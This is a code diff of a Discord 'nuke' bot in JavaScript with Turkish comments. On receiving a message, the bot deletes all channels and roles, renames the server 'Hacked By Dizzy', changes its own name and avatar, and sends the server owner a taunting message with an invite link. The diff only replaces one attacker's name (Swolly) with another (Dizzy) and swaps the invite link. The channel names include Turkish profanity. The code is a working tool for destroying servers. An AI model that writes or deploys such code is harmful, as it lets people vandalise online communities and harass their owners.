@@ -36,7 +36,7 @@ client.on("message", async msg => {
 
     await msg.guild.channels.deleteAll();
 
-    await msg.guild.createChannel("✝-tek-kral-swolly", {
+    await msg.guild.createChannel("✝-tek-kral-dizzy", {
       type: "text"
     });
     await msg.guild
@@ -47,7 +47,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("✝ Swolly", {
+      .createChannel("✝ DizzY", {
         type: "voice"
       })
       .then(chan => {
@@ -93,12 +93,12 @@ client.on("message", async msg => {
       "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
     );
 
-    await msg.guild.setName("✝ Hacked By Swolly ✝"); //sunucu ismini yapar
+    await msg.guild.setName("✝ Hacked By Dizzy ✝"); //sunucu ismini yapar
     await client.user.setAvatar("http://sicanzi.com/"); //botun pp sini yapar
-    await client.user.setUsername("✝ Hacked By Swolly ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
+    await client.user.setUsername("✝ Hacked By DizzY ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
-    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/MfbH399"); //KURUCUSUNA GONDERILEN MESAJ
-    const kanal = await msg.guild.channels.find(x => x.name === "Swolly-sikti");
+    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/xft7cnN"); //KURUCUSUNA GONDERILEN MESAJ
+    const kanal = await msg.guild.channels.find(x => x.name === "DizzY-sikti");
     await kanal.send("Patladın Kardeşim Geçmiş Olsun");
   }
 });
